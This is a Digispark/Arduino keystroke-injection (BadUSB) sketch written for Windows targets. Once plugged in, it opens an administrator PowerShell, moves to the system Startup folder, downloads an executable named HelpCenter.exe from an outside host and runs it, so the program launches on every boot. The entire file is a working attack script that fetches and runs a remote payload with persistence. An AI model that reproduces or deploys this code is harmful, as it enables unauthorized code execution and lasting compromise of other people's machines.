#define kbd_tr_tr
#include "DigiKeyboard.h"
#define KEY_INTL_BACKSLASH    0x31
void setup() {
  pinMode(1, OUTPUT); //LED on Model A 
}

void loop() {
   
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);
  DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
  DigiKeyboard.delay(1500);
  DigiKeyboard.print(F("powershell")); 
  DigiKeyboard.sendKeyStroke(KEY_ENTER,MOD_CONTROL_LEFT | MOD_SHIFT_LEFT ); // Open powershell as Administrator
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1500);
  DigiKeyboard.print(F("cd \"C:/ProgramData/Microsoft/Windows/Start Menu/Programs/Startup\";"));  // Navigate to startup folder so on each startup, program will launch
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  //DigiKeyboard.print(F("powershell -command \"& {iwr https://filestorageserver.pythonanywhere.com/download/HelpCenter.exe -OutFile Words.py}\"")); 
  DigiKeyboard.print(F("Invoke-WebRequest -Uri https://filestorageserver.pythonanywhere.com/download/HelpCenter.exe -OutFile HelpCenter.exe;")); 
  DigiKeyboard.sendKeyStroke(KEY_ENTER);     // Download the program
  DigiKeyboard.delay(2000); 
  DigiKeyboard.print(F("HelpCenter.exe"));   // Can't send "\" so write app name and hit tab to autocomplete to .\HelpCenter.exe  
  DigiKeyboard.sendKeyStroke(43);            // Press Tab 
  DigiKeyboard.delay(500);
  DigiKeyboard.print(F(";Exit;"));           // Add exit to end of command so when it starts, powershell window closes
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);  
  digitalWrite(1, HIGH); 
  for(;;); 
}
